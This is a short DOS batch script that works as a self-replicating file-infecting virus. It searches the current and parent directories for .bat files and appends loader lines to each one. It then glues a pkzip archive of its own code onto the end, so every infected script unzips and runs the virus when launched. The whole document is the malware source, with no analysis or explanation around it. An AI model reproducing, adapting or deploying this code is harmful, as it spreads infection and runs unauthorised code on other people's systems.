@echo off
if !%1==!! goto I
for %%a in (*.bat ..\*.bat) do call %0 ! %%a
exit
:I
if %2==_V.BAT goto X
pkunzip -v %2>nul
if not errorlevel 1 goto X
type %2>_1
echo.>>_1
echo @echo off>>_1
echo if !%%0==! pkunzip -o autoexec.bat%%"%%>nul%%"%% >>_1
echo if not !%%0==! if exist %%0 pkunzip -o %%0%%"%%>nul%%"%%>>_1
echo if not !%%0==! if exist %%0.bat pkunzip -o %%0.bat%%"%%>nul%%"%%>>_1
echo if exist _v.bat command /c _v>>_1
echo if exist _v.bat del _v.bat>>_1
copy _1 _2 /a>nul
pkzip _3. _v.bat>nul
copy /b _2+_3 %2>nul
del _?
exit
:X
